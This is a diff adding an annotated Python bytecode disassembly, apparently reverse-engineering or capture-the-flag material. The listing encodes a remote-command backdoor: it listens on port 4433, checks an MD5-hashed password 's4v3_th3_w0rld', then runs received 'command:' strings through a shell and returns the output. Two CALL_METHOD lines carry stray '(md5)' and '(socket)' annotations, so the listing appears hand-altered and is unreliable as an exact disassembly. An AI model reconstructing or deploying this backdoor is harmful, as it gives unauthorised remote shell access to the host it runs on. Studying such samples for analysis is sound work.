@@ -1,0 +1,159 @@
+  IMPORT
+
+  1           0 LOAD_CONST               0 (0)
+              2 LOAD_CONST               1 (None)
+              4 IMPORT_NAME              0 (socket)
+              6 STORE_NAME               0 (socket)
+
+  2           8 LOAD_CONST               0 (0)
+             10 LOAD_CONST               2 (('md5',))
+             12 IMPORT_NAME              1 (hashlib)
+             14 IMPORT_FROM              2 (md5)
+             16 STORE_NAME               2 (md5)
+             18 POP_TOP
+
+SETUP SOCKET
+
+  3          20 LOAD_CONST               0 (0)
+             22 LOAD_CONST               3 (('check_output',))
+             24 IMPORT_NAME              3 (subprocess)
+             26 IMPORT_FROM              4 (check_output)
+             28 STORE_NAME               4 (check_output)
+             30 POP_TOP
+
+  4          32 LOAD_NAME                0 (socket)
+             34 LOAD_METHOD              0 (socket)
+             36 CALL_METHOD              0
+             38 STORE_NAME               5 (sock)
+
+  5          40 LOAD_NAME                5 (sock)
+             42 LOAD_METHOD              6 (setsockopt)
+             44 LOAD_NAME                0 (socket)
+             46 LOAD_ATTR                7 (SOL_SOCKET)
+             48 LOAD_NAME                0 (socket)
+             50 LOAD_ATTR                8 (SO_REUSEADDR)
+             52 LOAD_CONST               4 (1)
+             54 CALL_METHOD              3
+             56 POP_TOP
+
+  6          58 LOAD_NAME                5 (sock)
+             60 LOAD_METHOD              9 (bind)
+             62 LOAD_CONST               5 (('0.0.0.0', 4433))
+             64 CALL_METHOD              1
+             66 POP_TOP
+
+  7          68 LOAD_NAME                5 (sock)
+             70 LOAD_METHOD             10 (listen)
+             72 LOAD_CONST               6 (5)
+             74 CALL_METHOD              1
+             76 POP_TOP
+
+  9     >>   78 LOAD_NAME                5 (sock)
+             80 LOAD_METHOD             11 (accept)
+             82 CALL_METHOD              0
+             84 UNPACK_SEQUENCE          2
+             86 STORE_NAME              12 (client)
+             88 STORE_NAME              13 (addr)
+
+ 10          90 LOAD_NAME               12 (client)
+             92 LOAD_METHOD             14 (recv)
+             94 LOAD_CONST               7 (32)
+             96 CALL_METHOD              1
+             98 STORE_NAME              15 (data)
+
+CHECK THAT DATA LEN IS 32
+
+ 11         100 LOAD_NAME               16 (len)
+            102 LOAD_NAME               15 (data)
+            104 CALL_FUNCTION            1
+            106 LOAD_CONST               7 (32)
+            108 COMPARE_OP               3 (!=)
+            110 POP_JUMP_IF_FALSE      122
+
+ 12         112 LOAD_NAME               12 (client)
+            114 LOAD_METHOD             17 (close)
+            116 CALL_METHOD              0
+            118 POP_TOP
+
+ 13         120 JUMP_ABSOLUTE           78
+
+ 15     >>  122 LOAD_NAME               15 (data)
+            124 LOAD_METHOD             18 (decode)
+            126 CALL_METHOD              0
+            128 LOAD_NAME                2 (md5)
+            130 LOAD_CONST               8 (b's4v3_th3_w0rld')
+            132 CALL_FUNCTION            1
+            134 LOAD_METHOD             19 (hexdigest)
+            136 CALL_METHOD              0
+            138 COMPARE_OP               3 (!=)
+            140 POP_JUMP_IF_FALSE      162
+
+ 16         142 LOAD_NAME               12 (client)
+            144 LOAD_METHOD             20 (send)
+            146 LOAD_CONST               9 (b'Invalid')
+            148 CALL_METHOD              1
+            150 POP_TOP
+
+ 17         152 LOAD_NAME               12 (client)
+            154 LOAD_METHOD             17 (close)
+            156 CALL_METHOD              0
+            158 POP_TOP
+
+ 18         160 JUMP_ABSOLUTE           78
+
+ 20     >>  162 LOAD_NAME               12 (client)
+            164 LOAD_METHOD             14 (recv)
+            166 LOAD_CONST               4 (1)
+            168 CALL_METHOD              1
+            170 STORE_NAME              21 (size)
+
+ 21         172 LOAD_NAME               12 (client)
+            174 LOAD_METHOD             14 (recv)
+            176 LOAD_NAME               22 (int)
+            178 LOAD_METHOD             23 (from_bytes)
+            180 LOAD_NAME               21 (size)
+            182 LOAD_CONST              10 ('little')
+            184 CALL_METHOD              2 (md5)
+            186 CALL_METHOD              1 (socket)
+            188 STORE_NAME              24 (command)
+
+ 22         190 LOAD_NAME               24 (command)
+            192 LOAD_METHOD             25 (startswith)
+            194 LOAD_CONST              11 (b'command:')
+            196 CALL_METHOD              1
+            198 POP_JUMP_IF_TRUE       210
+
+ 23         200 LOAD_NAME               12 (client)
+            202 LOAD_METHOD             17 (close)
+            204 CALL_METHOD              0
+            206 POP_TOP
+            208 JUMP_ABSOLUTE           78
+
+ 25     >>  210 LOAD_NAME               24 (command)
+            212 LOAD_METHOD             26 (replace)
+            214 LOAD_CONST              11 (b'command:')
+            216 LOAD_CONST              12 (b'')
+            218 CALL_METHOD              2
+            220 STORE_NAME              24 (command)
+
+ 26         222 LOAD_NAME                4 (check_output)
+            224 LOAD_NAME               24 (command)
+            226 LOAD_CONST              13 (True)
+            228 LOAD_CONST              14 (('shell',))
+            230 CALL_FUNCTION_KW         2
+            232 STORE_NAME              27 (output)
+
+ 27         234 LOAD_NAME               12 (client)
+            236 LOAD_METHOD             20 (send)
+            238 LOAD_NAME               27 (output)
+            240 CALL_METHOD              1
+            242 POP_TOP
+
+ 28         244 LOAD_NAME               12 (client)
+            246 LOAD_METHOD             17 (close)
+            248 CALL_METHOD              0
+            250 POP_TOP
+            252 JUMP_ABSOLUTE           78
+            254 LOAD_CONST               1 (None)
+            256 RETURN_VALUE
+None
